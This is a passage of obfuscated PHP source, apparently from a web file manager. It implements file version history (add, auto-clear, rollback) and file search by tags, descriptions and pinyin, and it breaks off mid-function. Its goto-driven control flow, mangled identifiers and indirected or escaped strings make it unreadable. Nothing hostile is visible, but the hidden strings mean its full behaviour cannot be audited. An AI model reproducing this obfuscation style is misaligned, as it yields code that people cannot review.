$B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[1882]][$FŠ¢ƒ–±”Ø[390]]; $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[84]] = !1; $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[390]] = $FŠ¢ƒ–±”Ø[33]; } $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[1812]] = $e»è’—Œ”™[$B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[1491]]]; } unset($B×ãÂóÊµ¹); goto eÓë‚ğ´˜ô; A±¿¼‹—¥¾: $aÊËÅÎšùç = array_to_keyvalue($B……Êº›ˆ, $FŠ¢ƒ–±”Ø[33], $FŠ¢ƒ–±”Ø[1869]); foreach ($B……Êº›ˆ as $B×ãÂóÊµ¹) { $eÈ’“ºŸŸƒ = $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[425]]; if ($B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[29]] == $FŠ¢ƒ–±”Ø[515] && isset($eÈ’“ºŸŸƒ[$FŠ¢ƒ–±”Ø[1022]])) { $C‰Ü†’¹ğ[] = $eÈ’“ºŸŸƒ[$FŠ¢ƒ–±”Ø[1022]] . $FŠ¢ƒ–±”Ø[33]; $C‰Ü†’¹ğ[] = $eÈ’“ºŸŸƒ[$FŠ¢ƒ–±”Ø[1023]] . $FŠ¢ƒ–±”Ø[33]; } if ($B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[29]] == $FŠ¢ƒ–±”Ø[1877] && isset($eÈ’“ºŸŸƒ[$FŠ¢ƒ–±”Ø[390]])) { $C‰Ü†’¹ğ[] = $eÈ’“ºŸŸƒ[$FŠ¢ƒ–±”Ø[390]] . $FŠ¢ƒ–±”Ø[33]; } } $C‰Ü†’¹ğ = array_merge($C‰Ü†’¹ğ, $aÊËÅÎšùç, array($Aôß½‡Í¬ . $FŠ¢ƒ–±”Ø[33])); goto Fì‰ìœ°´•; eÓë‚ğ´˜ô: $f¦¸Å¼»Õí[$FŠ¢ƒ–±”Ø[365]] = $B……Êº›ˆ; return $f¦¸Å¼»Õí; goto d°ÇÜ·½Ùõ; bï‘Ù¬ÂØº: $FŠ¢ƒ–±”Ø =& $_SERVER[ç]; $B……Êº›ˆ = $f¦¸Å¼»Õí[$FŠ¢ƒ–±”Ø[365]]; $C‰Ü†’¹ğ = array_to_keyvalue($B……Êº›ˆ, $FŠ¢ƒ–±”Ø[33], $FŠ¢ƒ–±”Ø[390]); goto A±¿¼‹—¥¾; Fì‰ìœ°´•: $C‰Ü†’¹ğ = array_unique($C‰Ü†’¹ğ); $bÁ—æÉÃçŒ = array_unique(array_to_keyvalue($B……Êº›ˆ, $FŠ¢ƒ–±”Ø[33], $FŠ¢ƒ–±”Ø[1491])); $e»è’—Œ”™ = Model($FŠ¢ƒ–±”Ø[501])->userListInfo($bÁ—æÉÃçŒ); goto F‰¬ÈŠŸ¦; d°ÇÜ·½Ùõ: } public function removeBySource($e¼ÚÀ Şæ) { $Fƒ’ÙË±«İ = array($_SERVER[ç][404] => $e¼ÚÀ Şæ); $this->where($Fƒ’ÙË±«İ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\143\145\x5f\150\x69\163\164\x6f\162\171"; public function historyCount($E…†âßŸ™») { goto a÷Ö˜Ş¢¨á; F³÷¯†çÓ : $DõÕöÎ®Â = array($B‚—÷¥™¯Ê[390], $B‚—÷¥™¯Ê[1686] => $B‚—÷¥™¯Ê[474]); $b…‡½ğ±ğ¨ = array($B‚—÷¥™¯Ê[390] => array($B‚—÷¥™¯Ê[7], $E…†âßŸ™»)); $EóÃ·Ó† = $this->field($DõÕöÎ®Â)->where($b…‡½ğ±ğ¨)->group($B‚—÷¥™¯Ê[390])->select(); goto bç½ŞÓÖêä; a÷Ö˜Ş¢¨á: $B‚—÷¥™¯Ê =& $_SERVER[ç]; if (!$E…†âßŸ™») { return array(); } if (is_string($E…†âßŸ™») || is_int($E…†âßŸ™»)) { $E…†âßŸ™» = array($E…†âßŸ™»); } goto F³÷¯†çÓ ; bç½ŞÓÖêä: return array_to_keyvalue($EóÃ·Ó†, $B‚—÷¥™¯Ê[390], $B‚—÷¥™¯Ê[474]); goto A®Âà´ˆ††; A®Âà´ˆ††: } public function addHistory($fê­Õ•ĞºÌ, $AİŸ”×èˆÕ = '') { $e¤”£Ê =& $_SERVER[ç]; $AëÙˆäò™í = array($e¤”£Ê[404] => $fê­Õ•ĞºÌ[$e¤”£Ê[390]], $e¤”£Ê[1483] => isset($fê­Õ•ĞºÌ[$e¤”£Ê[428]]) ? $fê­Õ•ĞºÌ[$e¤”£Ê[428]] : $fê­Õ•ĞºÌ[$e¤”£Ê[426]], $e¤”£Ê[442] => $fê­Õ•ĞºÌ[$e¤”£Ê[441]], $e¤”£Ê[543] => $fê­Õ•ĞºÌ[$e¤”£Ê[77]], $e¤”£Ê[1883] => $AİŸ”×èˆÕ); $A¨Š‰À‹ö¯ = $GLOBALS[$e¤”£Ê[6]][$e¤”£Ê[87]][$e¤”£Ê[1070]]; if ($A¨Š‰À‹ö¯ > 1) { $this->historyAutoClear($AëÙˆäò™í[$e¤”£Ê[390]]); $this->add($AëÙˆäò™í); } Hook::trigger($e¤”£Ê[1884], $AëÙˆäò™í); Model($e¤”£Ê[1885])->eventFileEdit($fê­Õ•ĞºÌ[$e¤”£Ê[390]]); } private function historyAutoClear($cÕœ’·Óë‰) { goto aŒĞÒ›ÚÂ„; A‚šµÎ´Ò°: $f¤ø¢–ª¨Ğ = $DİòêŒÊË == $dÂ‡ÉØ»è[1093] ? 5 : $c¥¥Ë¨™ø; if ($c¥¥Ë¨™ø <= 1) { $f¤ø¢–ª¨Ğ = 1; } if ($f¤ø¢–ª¨Ğ >= 500) { return; } goto F×©´¢ƒŞ; F×©´¢ƒŞ: $fåÙœ²Üã = array($dÂ‡ÉØ»è[404] => $cÕœ’·Óë‰); $a°­Ó¡ƒß = $this->field($dÂ‡ÉØ»è[1886])->where($fåÙœ²Üã)->order($dÂ‡ÉØ»è[1880])->select(); if (!$a°­Ó¡ƒß || $f¤ø¢–ª¨Ğ >= count($a°­Ó¡ƒß)) { return; } goto b­„£Õ†Ù; aŒĞÒ›ÚÂ„: $dÂ‡ÉØ»è =& $_SERVER[ç]; $DİòêŒÊË = Model($dÂ‡ÉØ»è[1091])->get($dÂ‡ÉØ»è[1092]); $c¥¥Ë¨™ø = $GLOBALS[$dÂ‡ÉØ»è[6]][$dÂ‡ÉØ»è[87]][$dÂ‡ÉØ»è[1070]]; goto A‚šµÎ´Ò°; fùĞ¬‘•: $c¼î«ôŞ” = array_slice($c¼î«ôŞ”, $f¤ø¢–ª¨Ğ); if (!$f¤äÔê“İ‘ || !$c¼î«ôŞ”) { return; } $fåÙœ²Üã = array($dÂ‡ÉØ»è[406] => array($dÂ‡ÉØ»è[7], $f¤äÔê“İ‘)); goto Fï¬¿¦Ë¤; b­„£Õ†Ù: $f¤äÔê“İ‘ = array_to_keyvalue($a°­Ó¡ƒß, $dÂ‡ÉØ»è[33], $dÂ‡ÉØ»è[388]); $f¤äÔê“İ‘ = array_slice($f¤äÔê“İ‘, $f¤ø¢–ª¨Ğ); $c¼î«ôŞ” = array_to_keyvalue($a°­Ó¡ƒß, $dÂ‡ÉØ»è[33], $dÂ‡ÉØ»è[441]); goto fùĞ¬‘•; Fï¬¿¦Ë¤: $this->where($fåÙœ²Üã)->delete(); Model($dÂ‡ÉØ»è[444])->remove($c¼î«ôŞ”); goto Bğ˜©–šù; Bğ˜©–šù: } public function listData($FÚÑ¢ä¼©) { goto A˜ÛÀğ†Ö; eŞÄ‡‚å®: $cšäïŠôåØ = 5; if ($Fİ°‰‡´Ï‡ == $d£‰¥±ç[1093]) { $bĞ¤Ÿé¨[$d£‰¥±ç[365]] = array_slice($bĞ¤Ÿé¨[$d£‰¥±ç[365]], 0, $cšäïŠôåØ); $bĞ¤Ÿé¨[$d£‰¥±ç[362]] = array($d£‰¥±ç[1888] => 1, $d£‰¥±ç[1889] => 20, $d£‰¥±ç[1890] => 1, $d£‰¥±ç[1891] => count($bĞ¤Ÿé¨[$d£‰¥±ç[365]])); } return $bĞ¤Ÿé¨; goto c×ì¬‚…áê; aÉ¹œ¡—ï: $bĞ¤Ÿé¨ = $this->field($e„æŸ“ˆ½)->where($B—‡÷¸™†ì)->order($d£‰¥±ç[1880])->selectPage(); $this->_listAppendUser($bĞ¤Ÿé¨[$d£‰¥±ç[365]]); $Fİ°‰‡´Ï‡ = Model($d£‰¥±ç[1091])->get($d£‰¥±ç[1092]); goto eŞÄ‡‚å®; A˜ÛÀğ†Ö: $d£‰¥±ç =& $_SERVER[ç]; $B—‡÷¸™†ì = array($d£‰¥±ç[404] => $FÚÑ¢ä¼©); $e„æŸ“ˆ½ = $d£‰¥±ç[1887]; goto aÉ¹œ¡—ï; c×ì¬‚…áê: } protected function _listAppendUser(&$D©õ¥ˆª‡) { $A‘Ïë³­£ =& $_SERVER[ç]; $cÕÔë½“¾ = array_to_keyvalue($D©õ¥ˆª‡, $A‘Ïë³­£[33], $A‘Ïë³­£[1491]); $c¹°´‡Š Ä = Model($A‘Ïë³­£[501])->userListInfo($cÕÔë½“¾); foreach ($D©õ¥ˆª‡ as &$F¨ÃÚ­§ˆ) { $CÍÖï¿Ï…² = $F¨ÃÚ­§ˆ[$A‘Ïë³­£[1491]]; $F¨ÃÚ­§ˆ[$A‘Ïë³­£[426]] = $c¹°´‡Š Ä[$CÍÖï¿Ï…²] ? $c¹°´‡Š Ä[$CÍÖï¿Ï…²] : !1; } unset($F¨ÃÚ­§ˆ); } public function fileInfo($Cââ„çíå) { $Fà¨˜ è²… =& $_SERVER[ç]; $b”Íò»Æë¡ = $this->tablePrefix; $C´Ÿ«“§—£ = "{$b”Íò»Æë¡}\151\x6f\x5f\146\x69\154\145\40\x66\151\x6c\x65\x73\x20\157\156\40\146\151\x6c\145\163\x2e\146\151\x6c\x65\x49\x44\40\x3d\40\150\151\163\x74\157\x72\171\56\x66\x69\154\x65\111\x44"; return $this->alias($Fà¨˜ è²…[1892])->where(array($Fà¨˜ è²…[406] => $Cââ„çíå))->join($C´Ÿ«“§—£, $Fà¨˜ è²…[1893])->find(); } public function removeItem($e±ƒ¦µõ‘) { $dÑŒÆôàÓÜ =& $_SERVER[ç]; $f×ê‘¸÷ÌË = array($dÑŒÆôàÓÜ[406] => $e±ƒ¦µõ‘); $aÀÈàøƒ×¹ = $this->where($f×ê‘¸÷ÌË)->find(); if ($aÀÈàøƒ×¹) { $b‰ä§¯Õª = $this->where($f×ê‘¸÷ÌË)->delete(); Model($dÑŒÆôàÓÜ[444])->remove($aÀÈàøƒ×¹[$dÑŒÆôàÓÜ[441]]); return $b‰ä§¯Õª; } return !1; } public function removeBySource($BÆÁ×ŠĞíò) { goto F„‚‰‰ø‘¦; eé¨çìòòÚ: return !0; goto B§¨å×Ç¹ì; F„‚‰‰ø‘¦: $A±òÆ™õÅ½ =& $_SERVER[ç]; if (!$BÆÁ×ŠĞíò) { return !1; } if (!is_array($BÆÁ×ŠĞíò)) { $BÆÁ×ŠĞíò = array($BÆÁ×ŠĞíò); } goto Eâ£‹ÆØ‘İ; Eâ£‹ÆØ‘İ: $Bª«Ë™ = array($A±òÆ™õÅ½[404] => array($A±òÆ™õÅ½[7], $BÆÁ×ŠĞíò)); $dÅ³äø‡ò = $this->field($A±òÆ™õÅ½[442])->where($Bª«Ë™)->select(); if ($dÅ³äø‡ò) { $this->where($Bª«Ë™)->delete(); $B•¬Éåí = array_to_keyvalue($dÅ³äø‡ò, $A±òÆ™õÅ½[33], $A±òÆ™õÅ½[441]); Model($A±òÆ™õÅ½[444])->remove($B•¬Éåí); } goto eé¨çìòòÚ; B§¨å×Ç¹ì: } public function setDetail($d¡æó¯ŞÁµ, $B¦ÌÛÕ›¡Ñ) { $bÕ•ãš¸Ó =& $_SERVER[ç]; return $this->where(array($bÕ•ãš¸Ó[406] => $d¡æó¯ŞÁµ))->save(array($bÕ•ãš¸Ó[1883] => $B¦ÌÛÕ›¡Ñ)); } public function rollbackToItem($BŒç••¥å, $dˆ¡Çì¼ãÀ) { goto d³Æ ©òÊÂ; eØ–ÖÂÏï: $e­ğêÍ÷¶£ = $this->find($dˆ¡Çì¼ãÀ); $EµÂ¨äß±Ê = array($eÀŞº©˜Øì[441] => $e­ğêÍ÷¶£[$eÀŞº©˜Øì[441]], $eÀŞº©˜Øì[77] => $e­ğêÍ÷¶£[$eÀŞº©˜Øì[77]], $eÀŞº©˜Øì[83] => time(), $eÀŞº©˜Øì[428] => USER_ID); Model($eÀŞº©˜Øì[760])->where(array($eÀŞº©˜Øì[390] => $BŒç••¥å))->save($EµÂ¨äß±Ê); goto dæã¾Í†¨Æ; d³Æ ©òÊÂ: $eÀŞº©˜Øì =& $_SERVER[ç]; $B·‹ƒ“—¬“ = Model($eÀŞº©˜Øì[760])->sourceInfo($BŒç••¥å); $this->addHistory($B·‹ƒ“—¬“, LNG($eÀŞº©˜Øì[1894])); goto eØ–ÖÂÏï; dæã¾Í†¨Æ: return $this->where(array($eÀŞº©˜Øì[406] => $dˆ¡Çì¼ãÀ))->delete(); goto fö†§‘¤»«; fö†§‘¤»«: } public function clearSame($DÕß¨š…èÎ) { goto E•ËÓŸ« ¼; E•ËÓŸ« ¼: $d½è³ŒÖ£ =& $_SERVER[ç]; $bçƒ×í—µ = $this->listData($DÕß¨š…èÎ); $d—ÒëÃ¬ââ = array_to_keyvalue_group($bçƒ×í—µ, $d½è³ŒÖ£[441]); goto aôÔ×Ò¦Ó; aë‡ˆáö•ã: if (!$bÖ¹Œš„‚‰) { return; } $this->where(array($d½è³ŒÖ£[388] => array($d½è³ŒÖ£[7], $bÖ¹Œš„‚‰)))->delete(); Model($d½è³ŒÖ£[444])->remove($eí½âäîÍ…); goto eÖ·ëÑĞÎ; aôÔ×Ò¦Ó: $eí½âäîÍ… = array(); $bÖ¹Œš„‚‰ = array(); foreach ($d—ÒëÃ¬ââ as $C¡Ÿ»Äß) { if (!$C¡Ÿ»Äß || count($C¡Ÿ»Äß) <= 1) { continue; } foreach ($C¡Ÿ»Äß as $eÔ†ˆ÷ÎÑ—) { $eí½âäîÍ…[] = $eÔ†ˆ÷ÎÑ—[$d½è³ŒÖ£[441]]; $bÖ¹Œš„‚‰[] = $eÔ†ˆ÷ÎÑ—[$d½è³ŒÖ£[388]]; } } goto aë‡ˆáö•ã; eÖ·ëÑĞÎ: } public function userSpace() { $d–œ˜ŞÎ =& $_SERVER[ç]; $A‚ÃÔöÖ½î = $this->tablePrefix; $EŞí‚Çš¼ = array($d–œ˜ŞÎ[1483] => USER_ID); $FùŒĞÓÖ…” = "{$A‚ÃÔöÖ½î}\x69\x6f\137\x66\x69\x6c\x65\x20\x66\151\154\145\163\x20\157\x6e\40\146\151\x6c\x65\x73\x2e\x66\151\154\145\111\104\40\x3d\x20\x68\x69\163\x74\157\x72\171\x2e\x66\151\x6c\145\111\104"; return $this->alias($d–œ˜ŞÎ[1892])->where($EŞí‚Çš¼)->join($FùŒĞÓÖ…”, $d–œ˜ŞÎ[1893])->sum($d–œ˜ŞÎ[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Bîâ—§ğ‰) { goto BµŒÄèÊË…; BâïØß…Ö: if (!$bÛÆ–‘’¥Í) { return array(); } $E¤”ÇÆÂ×ô = $bÛÆ–‘’¥Í[$Dâ¿ã¨ãİ[167]]; $CµáØ‚¬« = $Dâ¿ã¨ãİ[7]; goto C¹‚¿Ûùí; C¹‚¿Ûùí: if (!$bÛÆ–‘’¥Í[$Dâ¿ã¨ãİ[167]]) { $E›äÚ¸±åŒ = array_to_keyvalue($b¤ ¿¾„ó‚, $Dâ¿ã¨ãİ[33], $Dâ¿ã¨ãİ[167]); $E¤”ÇÆÂ×ô = implode($Dâ¿ã¨ãİ[47], $E›äÚ¸±åŒ); $CµáØ‚¬« = $Dâ¿ã¨ãİ[1895]; } $BÇï”°•Á = explode($Dâ¿ã¨ãİ[47], trim($E¤”ÇÆÂ×ô, $Dâ¿ã¨ãİ[47])); return array($CµáØ‚¬«, $BÇï”°•Á); goto aÉ„˜“‘°ó; BµŒÄèÊË…: $Dâ¿ã¨ãİ =& $_SERVER[ç]; $b¤ ¿¾„ó‚ = KodIO::fileTypeList(); $bÛÆ–‘’¥Í = $b¤ ¿¾„ó‚[$Bîâ—§ğ‰]; goto BâïØß…Ö; aÉ„˜“‘°ó: } public function listPathType($fÀğÇƒÄƒô) { $BÙóÜ®¾¤ò =& $_SERVER[ç]; $cŠ¢×¬¸ä‘ = $this->fileTypeWhere($fÀğÇƒÄƒô); if (!$cŠ¢×¬¸ä‘) { return array(); } $Fé´Ú›®ÁÅ = array($BÙóÜ®¾¤ò[544] => SourceModel::TYPE_USER, $BÙóÜ®¾¤ò[545] => USER_ID, $BÙóÜ®¾¤ò[541] => 0, $BÙóÜ®¾¤ò[542] => $cŠ¢×¬¸ä‘); return $this->listSource($Fé´Ú›®ÁÅ); } public function listSearch($B«âÑİŠ‚È, $B±îİó¯ô = 300) { goto E·÷ĞŠ£; cº¦ñ£¤: $C¬Â–Ìá¸ = $this->distinct(!0)->field($E¶Ñœ”£»Ç)->where($Fùì…ÛšÕ‘)->selectPage($B±îİó¯ô); $this->_listSearchDesc($C¬Â–Ìá¸, $B«âÑİŠ‚È, $CŒîÙ‡÷£¼); $this->_listSearchTag($C¬Â–Ìá¸, $B«âÑİŠ‚È, $CŒîÙ‡÷£¼); goto dì¼áÊõ¼ ; DíÁÊ„Óõ´: return $C¬Â–Ìá¸; goto bÑ÷•¦¼œÕ; dì¼áÊõ¼ : $this->_listSearchGroupTag($C¬Â–Ìá¸, $B«âÑİŠ‚È, $CŒîÙ‡÷£¼); $this->_listDataApply($C¬Â–Ìá¸[$A§“êÜ±¢Â[365]]); $this->_listMake($C¬Â–Ìá¸); goto DíÁÊ„Óõ´; E³Ğ³½’É«: if (!isset($Fùì…ÛšÕ‘[$A§“êÜ±¢Â[417]])) { $Fùì…ÛšÕ‘[$A§“êÜ±¢Â[417]] = 0; } $E¶Ñœ”£»Ç = $A§“êÜ±¢Â[1897]; $CŒîÙ‡÷£¼ = $E¶Ñœ”£»Ç; goto DÊ´ì•çêŸ; E·÷ĞŠ£: $A§“êÜ±¢Â =& $_SERVER[ç]; if (isset($B«âÑİŠ‚È[$A§“êÜ±¢Â[1738]]) && $B«âÑİŠ‚È[$A§“êÜ±¢Â[1738]]) { $B«âÑİŠ‚È[$A§“êÜ±¢Â[1738]] = str_replace($A§“êÜ±¢Â[379], $A§“êÜ±¢Â[1896], trim($B«âÑİŠ‚È[$A§“êÜ±¢Â[1738]])); } $Fùì…ÛšÕ‘ = $this->_parseSearchWhere($B«âÑİŠ‚È); goto E³Ğ³½’É«; DÊ´ì•çêŸ: $this->_listSearchBindPinyin($B«âÑİŠ‚È, $Fùì…ÛšÕ‘, $E¶Ñœ”£»Ç); $this->alias($A§“êÜ±¢Â[511])->_makeOrder(); $Fùì…ÛšÕ‘ = $this->parseWhereLike($Fùì…ÛšÕ‘); goto cº¦ñ£¤; bÑ÷•¦¼œÕ: } private function _listSearchTag(&$bá÷ö÷´ğ±, $fÌŸ ÌÑ, $c’ÚïÈ”Ñä) { goto CššÏÙ˜Î—; Fôõ‚‘ÓŒ: $Fƒèõ§¹‹ = array(); $cäš–æÒ§ = $fÌŸ ÌÑ[$b‹·©ƒ’è[1738]]; foreach ($A‚™¢—Œ­° as $cÉ‚àËíÍÚ) { $dËŠ™²õ¥Õ = $cÉ‚àËíÍÚ[$b‹·©ƒ’è[28]]; $F¯ŠïŠ„™« = str_replace($b‹·©ƒ’è[50], $b‹·©ƒ’è[33], Pinyin::encode($dËŠ™²õ¥Õ)); if (stripos($dËŠ™²õ¥Õ, $cäš–æÒ§) !== !1 || stripos($F¯ŠïŠ„™«, $cäš–æÒ§) !== !1) { $Fƒèõ§¹‹[] = $cÉ‚àËíÍÚ[$b‹·©ƒ’è[388]]; } } goto bÀ‰ìŒõ; bÀ‰ìŒõ: if (!$Fƒèõ§¹‹) { return; } $eš¼§ù…ç = array($b‹·©ƒ’è[413] => array($b‹·©ƒ’è[7], $Fƒèõ§¹‹), $b‹·©ƒ’è[1491] => USER_ID); $eéƒáÃğ•† = Model($b‹·©ƒ’è[414])->field($b‹·©ƒ’è[75])->where($eš¼§ù…ç)->select(); goto BÀĞ’™š½÷; BÀĞ’™š½÷: $eéƒáÃğ•† = array_to_keyvalue($eéƒáÃğ•†, $b‹·©ƒ’è[33], $b‹·©ƒ’è[75]); $E²¯¶Ôé· = array_unique($eéƒáÃğ•†); $this->_listSearchMerge($bá÷ö÷´ğ±, $fÌŸ ÌÑ, $c’ÚïÈ”Ñä, $E²¯¶Ôé·); goto AºÜŞæÎ; CššÏÙ˜Î—: $b‹·©ƒ’è =& $_SERVER[ç]; if (!$fÌŸ ÌÑ[$b‹·©ƒ’è[1738]] || $bá÷ö÷´ğ±[$b‹·©ƒ’è[362]][$b‹·©ƒ’è[349]] > 1) { return; } $A‚™¢—Œ­° = Model($b‹·©ƒ’è[1898])->listData(); goto Fôõ‚‘ÓŒ; AºÜŞæÎ: } private function _listSearchDesc(&$b°õÎç…èĞ, $aÛ¼Ã½°‘, $b·Öàó§†Î) { goto EƒßÂãçïí; EƒßÂãçïí: $a«ã×–¨ß =& $_SERVER[ç]; if (!$aÛ¼Ã½°‘[$a«ã×–¨ß[1738]] || $b°õÎç…èĞ[$a«ã×–¨ß[362]][$a«ã×–¨ß[349]] > 1) { return; } $eÛì­ô—Ğø = $this->listSearchChildren($aÛ¼Ã½°‘[$a«ã×–¨ß[472]]); goto Fƒ™ğó¿ñÖ; Fƒ™ğó¿ñÖ: $eÛì­ô—Ğø = array_unique($eÛì­ô—Ğø); if (!$eÛì­ô—Ğø) { return; } $C¾Üæ½Šæ = array($a«ã×–¨ß[390] => array($a«ã×–¨ß[7], $eÛì­ô—Ğø), $a«ã×–¨ß[92] => $a«ã×–¨ß[425], $a«ã×–¨ß[370] => array($a«ã×–¨ß[378], $a«ã×–¨ß[1740] . $aÛ¼Ã½°‘[$a«ã×–¨ß[1738]] . $a«ã×–¨ß[1740])); goto FË“ò—³“¼; FË“ò—³“¼: $fÂçš¡‚ä½ = Model($a«ã×–¨ß[527])->field($a«ã×–¨ß[390])->where($C¾Üæ½Šæ)->select(); $C¦İ®ÅÇ›¸ = array_to_keyvalue($fÂçš¡‚ä½, $a«ã×–¨ß[33], $a«ã×–¨ß[390]); $this->_listSearchMerge($b°õÎç…èĞ, $aÛ¼Ã½°‘, $b·Öàó§†Î, $C¦İ®ÅÇ›¸); goto FÁ·ŠŠô¾ç; FÁ·ŠŠô¾ç: } private function _listSearchGroupTag(&$B ·½—¯öØ, $CìÂò‚õğ, $c¶¥´†ö®œ) { goto aï‚à‚®¹ ; Fœâ·‡‰—‹: $bß®‡ë‹ê¢ = array(); $a‹®ˆ¬ëŠø = $CìÂò‚õğ[$Bö¾ÇÄ‚½[1738]]; foreach ($cŸ±ï‡¾Ò”[$Bö¾ÇÄ‚½[365]] as $fÎ£ŠãíË¦) { $Dƒİîæİ®Ç = $fÎ£ŠãíË¦[$Bö¾ÇÄ‚½[28]]; $EÁŠ Í’ÈŸ = str_replace($Bö¾ÇÄ‚½[50], $Bö¾ÇÄ‚½[33], Pinyin::encode($Dƒİîæİ®Ç)); if (stripos($Dƒİîæİ®Ç, $a‹®ˆ¬ëŠø) !== !1 || stripos($EÁŠ Í’ÈŸ, $a‹®ˆ¬ëŠø) !== !1) { $bß®‡ë‹ê¢[] = $fÎ£ŠãíË¦[$Bö¾ÇÄ‚½[388]]; } } goto C¿¯í•ò¹ğ; C¿¯í•ò¹ğ: if (!$bß®‡ë‹ê¢) { return; } $Aõ½âÄª‡İ = array($Bö¾ÇÄ‚½[413] => array($Bö¾ÇÄ‚½[7], $bß®‡ë‹ê¢), $Bö¾ÇÄ‚½[1491] => 0, $Bö¾ÇÄ‚½[29] => $Bö¾ÇÄ‚½[1762] . $D¢’¡··°÷); $EˆÆßŒÂìõ = Model($Bö¾ÇÄ‚½[414])->field($Bö¾ÇÄ‚½[75])->where($Aõ½âÄª‡İ)->select(); goto a÷‰ƒñœ³Ï; a÷‰ƒñœ³Ï: $EˆÆßŒÂìõ = array_to_keyvalue($EˆÆßŒÂìõ, $Bö¾ÇÄ‚½[33], $Bö¾ÇÄ‚½[75]); $A˜´Œ©¦Í = array_unique($EˆÆßŒÂìõ); $this->_listSearchMerge($B ·½—¯öØ, $CìÂò‚õğ, $c¶¥´†ö®œ, $A˜´Œ©¦Í); goto d›Â²´İâù; aï‚à‚®¹ : $Bö¾ÇÄ‚½ =& $_SERVER[ç]; if (!$CìÂò‚õğ[$Bö¾ÇÄ‚½[1738]] || $B ·½—¯öØ[$Bö¾ÇÄ‚½[362]][$Bö¾ÇÄ‚½[349]] > 1 || !$CìÂò‚õğ[$Bö¾ÇÄ‚½[472]]) { return; } $a‰Á¦ìò—‰ = $this->sourceInfo($CìÂò‚õğ[$Bö¾ÇÄ‚½[472]]); goto AÜÔÓÔÎÇƒ; AÜÔÓÔÎÇƒ: if (!$a‰Á¦ìò—‰ || $a‰Á¦ìò—‰[$Bö¾ÇÄ‚½[398]] != SourceModel::TYPE_GROUP) { return; } $D¢’¡··°÷ = $a‰Á¦ìò—‰[$Bö¾ÇÄ‚½[478]]; $cŸ±ï‡¾Ò” = Model($Bö¾ÇÄ‚½[1899])->get($D¢’¡··°÷); goto Fœâ·‡‰—‹; d›Â²´İâù: } private function _listSearchMerge(&$eğº§éæ¸, $fÃô’Ûà™Ù, $AÈ¢Ü…¶Õù, $FŸ³…óÀ‹Š) { goto aÛòê™„¡; Fªíã—ôŒ : $aãñê´ìô¿ = $this->field($AÈ¢Ü…¶Õù)->where($Cãöµ½“¶)->select(); if (!$aãñê´ìô¿) { return; } $B†Õ§ô¸Ê£ = array(); goto e«äç×ÓôÒ; e«äç×ÓôÒ: foreach ($aãñê´ìô¿ as $a÷ÎôˆÀè) { if ($this->_listSearchFilter($a÷ÎôˆÀè, $fÃô’Ûà™Ù)) { $B†Õ§ô¸Ê£[] = $a÷ÎôˆÀè; } } $eğº§éæ¸[$Fáİ‹©·‹[365]] = array_merge($B†Õ§ô¸Ê£, $eğº§éæ¸[$Fáİ‹©·‹[365]]); $eğº§éæ¸[$Fáİ‹©·‹[362]][$Fáİ‹©·‹[363]] += count($B†Õ§ô¸Ê£); goto dšî‘èëå¤; eÒé×ˆ™Ü‰: $B÷¹Ï°…— = array_diff($FŸ³…óÀ‹Š, $D°Ú¤×˜‰•); if (!$B÷¹Ï°…—) { return; } $Cãöµ½“¶ = array($Fáİ‹©·‹[390] => array($Fáİ‹©·‹[7], $B÷¹Ï°…—)); goto Fªíã—ôŒ ; aÛòê™„¡: $Fáİ‹©·‹ =& $_SERVER[ç]; if (!$FŸ³…óÀ‹Š) { return; } $D°Ú¤×˜‰• = array_to_keyvalue($eğº§éæ¸[$Fáİ‹©·‹[365]], $Fáİ‹©·‹[33], $Fáİ‹©·‹[390]); goto eÒé×ˆ™Ü‰; dšî‘èëå¤: } private function _listSearchFilter($F ¦†‰¥êˆ, $b¥Š¾©ÀºÒ) { goto E‘éÎÊ œ; BÚ…ãØÆã: if (isset($b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[399]]) && $b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[399]] != $d•ƒ•ù–Ó¡[1705]) { if ($b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[399]] == $d•ƒ•ù–Ó¡[76] && !$F¶Å™Èãåœ) { return !1; } if ($b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[399]] != $d•ƒ•ù–Ó¡[76] && $F¶Å™Èãåœ) { return !1; } if (!strstr($F ¦†‰¥êˆ[$d•ƒ•ù–Ó¡[167]], $d•ƒ•ù–Ó¡[47] . $b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[399]] . $d•ƒ•ù–Ó¡[47])) { return !1; } } if (isset($b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[1900]]) && $b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[1900]] < $F ¦†‰¥êˆ[$d•ƒ•ù–Ó¡[77]]) { return !1; } if (isset($b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[1901]]) && $b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[1901]] > $F ¦†‰¥êˆ[$d•ƒ•ù–Ó¡[77]]) { return !1; } goto bŸ£ê´óò; bŸ£ê´óò: if (isset($b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[557]]) && $b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[557]] != $F ¦†‰¥êˆ[$d•ƒ•ù–Ó¡[428]]) { return !1; } return !0; goto dâ½×ŞÎ®Ü; E‘éÎÊ œ: $d•ƒ•ù–Ó¡ =& $_SERVER[ç]; $F¶Å™Èãåœ = $F ¦†‰¥êˆ[$d•ƒ•ù–Ó¡[397]] == $d•ƒ•ù–Ó¡[86]; if (!strstr($F ¦†‰¥êˆ[$d•ƒ•ù–Ó¡[481]], $d•ƒ•ù–Ó¡[47] . $b¥Š¾©ÀºÒ[$d•ƒ•ù–Ó¡[472]] . $d•ƒ•ù–Ó¡[47])) { return !1; } goto BÚ…ãØÆã; dâ½×ŞÎ®Ü: } public function listSearchChildren($AÖ…‹¶á„, $E›ŞÅÛÊ®ù = 5000) { goto AÍ³öíÑê; bç†‚Ÿë È: 